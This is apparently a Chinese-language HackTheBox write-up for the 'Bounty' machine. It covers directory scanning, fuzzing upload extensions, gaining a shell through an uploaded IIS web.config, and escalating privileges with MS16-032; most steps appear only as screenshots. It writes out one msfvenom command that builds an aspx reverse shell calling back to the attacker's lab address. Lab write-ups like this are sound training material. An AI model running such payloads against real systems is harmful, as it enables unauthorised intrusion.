+++
ShowToc = true
TocOpen = true
title = '0X006 Bounty'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE50b73d52938f8dd92624582f43421360image.png)

![](/htb_img/WEBRESOURCE158a53ed50b04b02fe88333a25910e95image.png)

# 获取立足点

目录扫描要仔细，gobuster最开始没扫出来，添加aspx后缀后扫出了：

![](/htb_img/WEBRESOURCEd074fad91d7ae895e3d24de42037f0c3image.png)

还有一个：

![](/htb_img/WEBRESOURCE290bef7cba7d9b437c8cef6f1fa1ed8aimage.png)

先上传一个试试：

![](/htb_img/WEBRESOURCEffd0b44cc682f4923731a293cd93e360image.png)

![](/htb_img/WEBRESOURCE14cb2d762c34f76a20036fa7fc577504image.png)

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 lPORT=8888 -f aspx -o cxk.aspx

![](/htb_img/WEBRESOURCEff697c6b8d0b448688cc2c2d7b448c5eimage.png)

看样子是后端校验：

![](/htb_img/WEBRESOURCE428c4be128599fd2c3cc19b820edbd6aimage.png)

这里是没想到的，我一直以为是常见的IIS解析漏洞，但是发现不行，后面看了一下官方文档，这里要FUZZ一下后缀，看看能上传哪些后缀：

![](/htb_img/WEBRESOURCE0ed7b3810f71f2d3a927add6bab5a3bbimage.png)

/SecLists-2023.2/Fuzzing/extensions-skipfish.fuzz.txt

发现congfig是可以使用的：

![](/htb_img/WEBRESOURCE381217727c5fde95497933ca69fb993aimage.png)

这个后缀在IIS7.0以上是可以getshell的：

[https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/](https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/)

同时可以在github找到相关项目：

https://github.com/0xPurpl3john/web.config

![](/htb_img/WEBRESOURCEdaecd0d5ed32bb9f118511101dcba521image.png)

![](/htb_img/WEBRESOURCEcc32ac0e88720bca4d2ecdddfd9ff008image.png)

![](/htb_img/WEBRESOURCE833669069ef148827677d372d1a1ae09image.png)

# 提权

![](/htb_img/WEBRESOURCEdb6c7fb99adecbc38aae0f5bc2df1bfdimage.png)

也是没有补丁的：

![](/htb_img/WEBRESOURCE39f51e9e0b66cda8726eba501f80d082image.png)

[https://github.com/zcgonvh/MS16-032/releases/tag/Release](https://github.com/zcgonvh/MS16-032/releases/tag/Release)

运行之前需要重新弹个shell:

![](/htb_img/WEBRESOURCE13637ed094fc8cff71e82ec81c435a3aimage.png)

![](/htb_img/WEBRESOURCE2a99ab8a07082ec27e2d6e7dddca9cc5image.png)

![](/htb_img/WEBRESOURCEe66629d806b17a054946a7d51858ecd3image.png)

![](/htb_img/WEBRESOURCEe1072ee6aeb1fa4934813b4752dee048image.png)

![](/htb_img/WEBRESOURCE64af2bfec5388fe2617f3e5daaad784fimage.png)